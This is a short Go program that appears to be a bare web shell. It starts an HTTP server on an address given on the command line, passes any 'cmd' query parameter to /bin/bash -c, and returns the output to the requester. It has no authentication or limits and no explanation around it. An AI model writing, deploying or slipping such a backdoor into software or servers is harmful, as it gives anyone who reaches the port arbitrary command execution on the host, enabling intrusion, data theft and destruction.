package main

import (
	"fmt"
	"net/http"
	"os"
	"os/exec"
)

var (
	shell = "/bin/bash"
	shellArg = "-c"
	addr string
)

func Handler(rw http.ResponseWriter, r *http.Request) {
	cmd := r.URL.Query().Get("cmd")

	if cmd == "" {
		return
	}

	command := exec.Command(shell, shellArg, cmd)
	output, err := command.Output()

	if err != nil {
		fmt.Println("Implementation error")
	}

	_ ,err = rw.Write([]byte(fmt.Sprintf("cmd : %v, result : %v", cmd, string(output))))
	_ = err

}

func main() {
	if len(os.Args) != 2 {
		fmt.Println("Wrong number of arguments")
		os.Exit(1)
	}

	addr := os.Args[1]
	http.HandleFunc("/", Handler)
	err := http.ListenAndServe(addr, nil)
	_ = err
}